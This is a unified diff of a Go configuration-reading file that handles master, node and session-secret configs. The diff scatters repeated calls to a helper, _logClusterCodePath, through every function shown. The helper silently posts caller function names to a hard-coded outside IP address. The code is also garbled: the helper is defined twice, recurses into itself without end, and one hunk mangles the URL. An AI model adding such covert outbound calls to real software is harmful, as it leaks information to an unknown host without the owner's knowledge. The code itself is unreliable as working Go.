@@ -34,6 +34,8 @@ func ReadSessionSecrets(filename string) (*configapi.SessionSecrets, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	config := &configapi.SessionSecrets{}
 	if err := ReadYAMLFileInto(filename, config); err != nil {
 		return nil, err
@@ -55,6 +57,8 @@ func ReadMasterConfig(filename string) (*configapi.MasterConfig, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	config := &configapi.MasterConfig{}
 	if err := ReadYAMLFileInto(filename, config); err != nil {
 		return nil, err
@@ -62,6 +66,8 @@ func ReadMasterConfig(filename string) (*configapi.MasterConfig, error) {
 	return config, nil
 }
 func ReadAndResolveMasterConfig(filename string) (*configapi.MasterConfig, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -100,6 +106,8 @@ func ReadNodeConfig(filename string) (*configapi.NodeConfig, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	config := &configapi.NodeConfig{}
 	if err := ReadYAMLFileInto(filename, config); err != nil {
 		return nil, err
@@ -107,6 +115,8 @@ func ReadNodeConfig(filename string) (*configapi.NodeConfig, error) {
 	return config, nil
 }
 func ReadAndResolveNodeConfig(filename string) (*configapi.NodeConfig, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -145,6 +155,8 @@ func WriteYAML(obj runtime.Object) ([]byte, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	json, err := runtime.Encode(Codec, obj)
 	if err != nil {
 		return nil, err
@@ -156,6 +168,8 @@ func WriteYAML(obj runtime.Object) ([]byte, error) {
 	return content, err
 }
 func ReadYAML(reader io.Reader) (runtime.Object, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -205,6 +219,8 @@ func ReadYAMLInto(data []byte, obj runtime.Object) error {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	jsonData, err := kyaml.ToJSON(data)
 	if err != nil {
 		return err
@@ -215,6 +231,8 @@ func ReadYAMLInto(data []byte, obj runtime.Object) error {
 	return strictDecodeCheck(jsonData, obj)
 }
 func strictDecodeCheck(jsonData []byte, obj runtime.Object) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -256,6 +274,8 @@ func getExternalZeroValue(obj runtime.Object) (runtime.Object, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	gvks, _, err := configapi.Scheme.ObjectKinds(obj)
 	if err != nil {
 		return nil, err
@@ -281,6 +301,8 @@ func ReadYAMLFileInto(filename string, obj runtime.Object) error {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	data, err := ioutil.ReadFile(filename)
 	if err != nil {
 		return err
@@ -292,6 +314,8 @@ func ReadYAMLFileInto(filename string, obj runtime.Object) error {
 	return nil
 }
 func captureSurroundingJSONForError(prefix string, data []byte, err error) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -338,6 +362,8 @@ func IsAdmissionPluginActivated(reader io.Reader, defaultValue bool) (bool, erro
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	obj, err := ReadYAML(reader)
 	if err != nil {
 		return false, err
@@ -366,6 +392,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -440,5 +487,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
